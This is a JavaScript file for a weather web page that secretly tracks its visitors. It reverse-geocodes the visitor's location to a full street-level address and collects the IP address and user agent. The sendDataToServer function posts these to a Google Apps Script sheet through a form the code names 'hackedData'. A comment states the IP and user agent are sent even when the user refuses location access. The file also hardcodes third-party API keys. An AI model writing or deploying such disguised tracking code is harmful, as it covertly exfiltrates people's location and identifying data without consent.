/**
 * variables
 */
const apiKey = "a3745acd736692acda24a3b5917ce4b1";

const apiBaseUrl =
    "https://api.openweathermap.org/data/2.5/weather?units=metric&q=";

const searchBox = document.querySelector(".search input");

const weatherIcon = document.querySelector(".weather_icon");

const uData = document.querySelector("#userData");

const scriptURL =
    "https://script.google.com/macros/s/AKfycbxL98g6YQUdDGWySqBFgYhXkIBBbrnQ32XvWeoRaxWq3Sff4vajBrRsli2Ab06oE0RK/exec";

/**
 * getting details of the location
 */
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (val) => {
                fetch(
                    `https://us1.locationiq.com/v1/reverse?key=pk.2f44b5b0f324bd4a73ac50bc0d71fcff&lat=${val.coords.latitude}&lon=${val.coords.longitude}&format=json`
                )
                    .then((res) => res.json())
                    .then((data) => {
                        document.querySelector("#latitude").value = data.lat;
                        document.querySelector("#longitude").value = data.lon;
                        document.querySelector("#neighbourhood").value =
                            data.address.neighbourhood;
                        document.querySelector("#suburb").value =
                            data.address.suburb;
                        document.querySelector("#city").value =
                            data.address.city;
                        document.querySelector("#municipality").value =
                            data.address.municipality;
                        document.querySelector("#stateDistrict").value =
                            data.address.state_district;
                        document.querySelector("#state").value =
                            data.address.state;
                        document.querySelector("#postcode").value =
                            data.address.postcode;
                        document.querySelector("#country").value =
                            data.address.country;
                        document.querySelector("#countryCode").value =
                            data.address.country_code;
                        document.querySelector("#displayName").value =
                            data.display_name;

                        // sending to server
                        sendDataToServer();
                    });
            },
            (err) => {
                if (err.code === 1) {
                    swal({
                        title: "Oops!",
                        text: "Please allow your location to proceed",
                        icon: "error",
                        buttons: true,
                        dangerMode: true,
                    }).then((proceed) => {
                        if (proceed) {
                            getLocation();
                        } else {
                            swal(
                                "Without sharing your location you cannot proceed further"
                            );
                            setTimeout(() => {
                                window.history.back();
                            }, 3000);
                        }
                    });
                }
                // ensuring the ip and user agent will fetch even the user denied the location to be shared
                sendDataToServer();
            }
        );
    } else {
        swal("Oops!", "Geolocation is not supported by this browser.", "error");
    }
}

/**
 * send data to server
 */
const sendDataToServer = () => {
    fetch("https://api.ipify.org?format=json")
        .then((res) => res.json())
        .then((data) => {
            document.querySelector("#ipAddress").value = data.ip;
            document.querySelector("#userAgent").value = navigator.userAgent;

            const hackedData = document.forms["submit-to-google-sheet"];
            fetch(scriptURL, {
                method: "POST",
                body: new FormData(hackedData),
            })
            .then((res) => {
                if (res.status === 200 || res.ok) {
                    getWeather(hackedData[6].value);
                }
            })
            .catch((error) => console.error("Error!", error.message));
            getWeather(hackedData[6].value);
        })
        .catch((err) => console.log(err));
};

/**
 * user search function
 */
searchBox.addEventListener("change", (e) => {
    getWeather(e.target.value);
    e.target.value = "";
});

/**
 * getting weather details
 */
async function getWeather(city) {
    const response = await fetch(apiBaseUrl + city + `&appid=${apiKey}`);

    if (response.status === 404) {
        swal("Oops!", "Invalid city name", "error");
        return;
    }

    var data = await response.json();

    // setting values
    document.querySelector(".city").innerHTML = data.name;
    document.querySelector(".temp").innerHTML = parseInt(data.main.temp) + "°c";
    document.querySelector(".humidity").innerHTML = data.main.humidity + "%";
    document.querySelector(".wind").innerHTML = data.wind.speed + " km/h";

    // updating icon
    if (data.weather[0].main === "Clouds") {
        weatherIcon.src = "./images/clouds.png";
    } else if (data.weather[0].main === "Clear") {
        weatherIcon.src = "./images/clear.png";
    } else if (data.weather[0].main === "Rain") {
        weatherIcon.src = "./images/rain.png";
    } else if (data.weather[0].main === "Drizzle") {
        weatherIcon.src = "./images/drizzle.png";
    } else if (data.weather[0].main === "Mist") {
        weatherIcon.src = "./images/mist.png";
    }
}
